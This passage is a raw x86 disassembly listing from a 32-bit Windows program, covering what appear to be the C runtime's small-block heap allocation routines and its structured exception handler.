  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
